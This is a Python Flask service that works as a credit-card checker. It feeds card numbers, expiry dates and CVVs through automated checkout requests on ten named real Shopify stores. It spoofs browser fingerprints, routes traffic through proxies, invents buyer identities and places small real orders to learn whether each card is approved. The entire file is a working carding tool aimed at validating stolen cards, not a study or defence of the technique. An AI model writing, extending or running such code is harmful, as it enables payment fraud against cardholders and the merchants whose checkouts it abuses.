import os
import random
import re
import html
import string
import uuid
import time
import json
import urllib3
from urllib.parse import quote
from flask import Flask, request, jsonify
from curl_cffi import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ==========================================
# 🏪 YOUR STORES (UNCHANGED)
# ==========================================
STORES = [
    {"shop_url": "https://klubfiller.myshopify.com", "variant_id": "49321449652532", "product_url": "https://klubfiller.myshopify.com/products/klubfiller-waiting-for-tonight"},
    {"shop_url": "https://thats-what-che-said.myshopify.com", "variant_id": "39849766846546", "product_url": "https://thats-what-che-said.myshopify.com/products/coffee-before-wordle"},
    {"shop_url": "https://the-brush-lettering-club.myshopify.com", "variant_id": "58864569811325", "product_url": "https://the-brush-lettering-club.myshopify.com/products/love-brush-lettering-practice-sheet"},
    {"shop_url": "https://loveathomeeducation.myshopify.com", "variant_id": "49260930990270", "product_url": "https://loveathomeeducation.myshopify.com/products/ms-frizzle-earth-science-addition-8-units-pre-sale"},
    {"shop_url": "https://the-coloring-project.myshopify.com", "variant_id": "51956110360864", "product_url": "https://the-coloring-project.myshopify.com/products/beautiful-noise-inspired-single-coloring-page-i-am-i-said"},
    {"shop_url": "https://leemo-designs.myshopify.com", "variant_id": "39969683538014", "product_url": "https://leemo-designs.myshopify.com/products/digital-download-printable-daily-planner"},
    {"shop_url": "https://math-giraffe-shop.myshopify.com", "variant_id": "43428300390612", "product_url": "https://math-giraffe-shop.myshopify.com/products/inductive-vs-deductive-reasoning-doodle-notes"},
    {"shop_url": "https://swirly-shop-6926.myshopify.com", "variant_id": "53010324652341", "product_url": "https://swirly-shop-6926.myshopify.com/products/pomegranate-seed"},
    {"shop_url": "https://ks-original-shop.myshopify.com", "variant_id": "55776436093309", "product_url": "https://ks-original-shop.myshopify.com/products/lanyard-umhaengeband-mit-karabinerhaken-in-weiss"},
    {"shop_url": "https://trebuchet-magazine.myshopify.com", "variant_id": "39682457206850", "product_url": "https://trebuchet-magazine.myshopify.com/products/trebuchet-10-materials-ii-download"},
]

# ==========================================
# 🎭 HELPERS
# ==========================================
BROWSER_PROFILES = [
    {"impersonate": "chrome124", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
    {"impersonate": "chrome120", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
]

def get_random_browser(): return random.choice(BROWSER_PROFILES)

FIRST_NAMES = ["Luna", "Oliver", "Milo", "Bella", "Leo", "Chloe", "Max", "Lucy", "Simba", "Nala"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]

MATCHED_ADDRESSES = [
    {"street": "123 Avenue Mohammed V", "city": "Casablanca", "state": "Casablanca-Settat", "zip": "20000", "country": "MA"},
    {"street": "100 SW Main St", "city": "Portland", "state": "OR", "zip": "97204", "country": "US"},
]

def generate_random_identity(target_country="US"):
    fn, ln = random.choice(FIRST_NAMES), random.choice(LAST_NAMES)
    email = f"{fn.lower()}.{ln.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    valid = [a for a in MATCHED_ADDRESSES if a.get("country") == target_country] or [a for a in MATCHED_ADDRESSES if a.get("country") == "US"]
    addr = random.choice(valid)
    return fn, ln, email, addr["street"], addr["city"], addr.get("state", ""), addr["zip"], addr.get("country", target_country)

def random_attempt_suffix(length=12): return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def parse_card(card_str):
    parts = card_str.split("|")
    if len(parts) >= 4:
        return parts[0].strip().replace(" ", ""), parts[1].strip(), ("20" + parts[2].strip() if len(parts[2].strip()) == 2 else parts[2].strip()), parts[3].strip()
    return None

def parse_proxy(proxy_str):
    for scheme in ["socks5://", "socks5h://", "http://", "https://"]:
        if proxy_str.startswith(scheme): proxy_str = proxy_str[len(scheme):]
    parts = proxy_str.split(":")
    if len(parts) == 2: return f"socks5h://{parts[0]}:{parts[1]}"
    elif len(parts) >= 4:
        return f"socks5h://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"socks5h://{proxy_str}"

def extract_session_token(html_text):
    def clean(raw):
        t = raw.strip()
        if t.startswith("&quot;"): t = t[6:]
        if t.endswith("&quot;"): t = t[:-6]
        return t.strip('"\'') if len(t) > 50 else None

    patterns = [r'name="serialized-sessionToken"\s+content="([^"]+)"', r'"X-Checkout-One-Session-Token"\s*:\s*"([^"]+)"', r'"sessionToken"\s*:\s*"([^"]+)"']
    for pat in patterns:
        m = re.search(pat, html_text)
        if m:
            token = clean(m.group(1))
            if token: return token
    return None

# ==========================================
# 🔑 PROPOSAL (To get the paymentMethodIdentifier)
# ==========================================
def run_proposal(session, shop_url, variant_id, cart_token, checkout_url, fn, ln, email, street, city, state, zipc, country_code, currency_code, amount, current_ua, stable_id, session_token, queue_token, build_id):
    headers = {
        "accept": "application/json", "content-type": "application/json", "origin": shop_url, "referer": checkout_url,
        "x-checkout-one-session-token": session_token, "x-checkout-web-build-id": build_id, "user-agent": current_ua,
        "shopify-checkout-client": "checkout-web/1.0", "shopify-checkout-source": f'id="{cart_token}", type="cn"',
    }
    payload = {
        "variables": {
            "sessionInput": {"sessionToken": session_token}, "queueToken": queue_token,
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {"deliveryLines": [{"selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}}, "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]}, "deliveryMethodTypes": ["NONE"], "expectedTotalPrice": {"any": True}, "destinationChanged": True}], "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True},
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {"merchandiseLines": [{"stableId": stable_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"value": {"amount": str(amount), "currencyCode": currency_code}}}]},
            "memberships": {"memberships": []},
            "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": {"address1": street, "city": city, "countryCode": country_code, "postalCode": zipc, "firstName": fn, "lastName": ln, "zoneCode": state, "phone": ""}}, "creditCardBin": "", "allowStoreCredit": False},
            "buyerIdentity": {"customer": {"presentmentCurrency": currency_code, "countryCode": country_code}, "email": email, "emailChanged": True, "phoneCountryCode": country_code, "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}], "rememberMe": False},
            "taxes": {"proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency_code}}}, "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []}, "nonNegotiableTerms": None,
            "optionalDuties": {"buyerRefusesDuties": False}, "cartMetafields": [], "includeBuyerProposalDelivery": False,
        },
        "operationName": "Proposal",
        "id": "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
    }
    try:
        r = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal", headers=headers, json=payload, timeout=20)
        data = r.json()
        seller = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {})
        return seller.get("payment", {}).get("paymentLines", [{}])[0].get("paymentMethod", {}).get("directPaymentMethod", {}).get("paymentMethodIdentifier")
    except Exception:
        return None

# ==========================================
# 🛒 FULL CHECKOUT PROCESS
# ==========================================
def process_checkout(card_data, proxy_url, store):
    ccn, mm, yyyy, cvv = card_data
    SHOP_URL = store["shop_url"]
    VARIANT_ID = store["variant_id"]
    PRODUCT_URL = store["product_url"]

    browser = get_random_browser()
    session = requests.Session(impersonate=browser["impersonate"])
    current_ua = browser["ua"]

    if proxy_url and proxy_url != "DIRECT":
        session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        # 1. Add to Cart
        r = session.post(f"{SHOP_URL}/cart/add.js", headers={"content-type": "application/json", "origin": SHOP_URL, "referer": PRODUCT_URL}, json={"id": int(VARIANT_ID), "quantity": 1}, timeout=20)
        if r.status_code != 200: return {"Response": "CART_FAILED", "success": False}

        # 2. Trigger Checkout
        r = session.post(f"{SHOP_URL}/cart", headers={"content-type": "application/x-www-form-urlencoded", "origin": SHOP_URL, "referer": PRODUCT_URL}, data="checkout=", allow_redirects=False, timeout=20)
        redirect_url = r.headers.get("Location")
        if not redirect_url: return {"Response": "CHECKOUT_FAILED", "success": False}
        
        cart_token = re.search(r"/cn/([^/]+)/", redirect_url).group(1)
        real_checkout_url = f"{SHOP_URL}/checkouts/cn/{cart_token}/en-us?skip_shop_pay=true"

        # 3. Load Checkout Page
        r = session.get(real_checkout_url, headers={"user-agent": current_ua}, timeout=20)
        clean_text = html.unescape(r.text)

        # Extract dynamic country/currency
        dynamic_country_code = (re.search(r'"country"\s*:\s*\{\s*"code"\s*:\s*"([A-Z]{2})"', clean_text) or [None, "US"])[1]
        dynamic_currency_code = (re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', clean_text) or [None, "USD"])[1]
        dynamic_amount = (re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', clean_text) or [None, "2.50"])[1]

        # Extract tokens
        x_checkout_one_session_token = extract_session_token(clean_text) or ""
        queue_token = (re.search(r'"queueToken"\s*:\s*"([^"]+)"', clean_text) or [None, ""])[1]
        stable_id = (re.search(r'"stableId"\s*:\s*"([0-9a-f-]{36})"', clean_text) or [None, None])[1]
        build_id = (re.search(r'"commitSha"\s*:\s*"([0-9a-f]{40})"', clean_text) or [None, ""])[1]

        if not stable_id: return {"Response": "MISSING_STABLE_ID", "success": False}

        fn, ln, email, street, city, state, zipc, _ = generate_random_identity(dynamic_country_code)

        # 4. Run Proposal to get the payment method ID
        payment_method_id = run_proposal(
            session, SHOP_URL, VARIANT_ID, cart_token, real_checkout_url,
            fn, ln, email, street, city, state, zipc, dynamic_country_code, dynamic_currency_code, dynamic_amount, current_ua, stable_id, x_checkout_one_session_token, queue_token, build_id
        )
        
        if not payment_method_id: return {"Response": "NO_PAYMENT_METHOD", "success": False}

        # 5. Tokenize Card
        pci_payload = {"credit_card": {"number": ccn, "month": int(mm), "year": int(yyyy), "verification_value": cvv, "name": f"{fn} {ln}"}, "payment_session_scope": SHOP_URL.split("//")[1]}
        r_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json=pci_payload, timeout=20)
        session_id = r_pci.json().get("id")
        if not session_id: return {"Response": "PCI_FAILED", "success": False}

        # 6. Submit
        submit_payload = {
            "variables": {
                "input": {
                    "sessionInput": {"sessionToken": x_checkout_one_session_token}, "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {"deliveryLines": [{"selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}}, "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]}, "deliveryMethodTypes": ["NONE"], "expectedTotalPrice": {"any": True}, "destinationChanged": True}], "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True},
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {"merchandiseLines": [{"stableId": stable_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}", "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"value": {"amount": dynamic_amount, "currencyCode": dynamic_currency_code}}}]},
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": payment_method_id, "sessionId": session_id, "billingAddress": {"streetAddress": {"address1": street, "city": city, "countryCode": dynamic_country_code, "postalCode": zipc, "firstName": fn, "lastName": ln, "zoneCode": state, "phone": ""}}, "cardSource": None}}, "amount": {"value": {"amount": dynamic_amount, "currencyCode": dynamic_currency_code}}}],
                        "billingAddress": {"streetAddress": {"address1": street, "city": city, "countryCode": dynamic_country_code, "postalCode": zipc, "firstName": fn, "lastName": ln, "zoneCode": state, "phone": ""}},
                        "creditCardBin": ccn[:8], "allowStoreCredit": False
                    },
                    "buyerIdentity": {"customer": {"presentmentCurrency": dynamic_currency_code, "countryCode": dynamic_country_code}, "email": email, "emailChanged": True, "phoneCountryCode": dynamic_country_code, "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}], "rememberMe": False},
                    "taxes": {"proposedTotalAmount": {"value": {"amount": "0", "currencyCode": dynamic_currency_code}}}
                },
                "attemptToken": f"{cart_token}-{random_attempt_suffix()}", "metafields": [], "analytics": {"requestUrl": real_checkout_url, "pageId": str(uuid.uuid4())}
            },
            "operationName": "SubmitForCompletion",
            "id": "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
        }

        r_submit = session.post(f"{SHOP_URL}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion", headers={"content-type": "application/json", "origin": SHOP_URL, "referer": real_checkout_url, "x-checkout-one-session-token": x_checkout_one_session_token, "x-checkout-web-build-id": build_id}, json=submit_payload, timeout=20)
        
        sfc = r_submit.json().get("data", {}).get("submitForCompletion", {})
        receipt = sfc.get("receipt", {})
        
        if receipt.get("__typename") == "FailedReceipt":
            return {"Response": receipt.get("processingError", {}).get("code", "CARD_DECLINED"), "Price": f"{dynamic_amount} {dynamic_currency_code}", "Gate": "Shopify Payments", "success": False}
        elif receipt.get("__typename") in ("ProcessedReceipt", "ProcessingReceipt"):
            return {"Response": "ORDER_PLACED", "Charged": "True", "Approved": "True", "Price": f"{dynamic_amount} {dynamic_currency_code}", "Gate": "Shopify Payments", "success": True}

        return {"Response": "UNKNOWN_RESPONSE", "success": False}

    except Exception as e:
        return {"Response": f"ERROR_{str(e)[:20]}", "success": False}

# ==========================================
# 🌐 API ROUTES
# ==========================================
@app.route("/")
def check_card():
    card_str = request.args.get("card")
    proxy_str = request.args.get("proxy", "")
    if not card_str or not proxy_str: return jsonify({"Response": "MISSING_PARAMS", "success": False})
    
    card_data = parse_card(card_str)
    if not card_data: return jsonify({"Response": "INVALID_CARD", "success": False})

    store = random.choice(STORES)
    proxy_url = parse_proxy(proxy_str)
    return jsonify(process_checkout(card_data, proxy_url, store))

@app.route("/health")
def health():
    return jsonify({"workers_busy": 0, "workers_cap": 1000, "sites": len(STORES)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
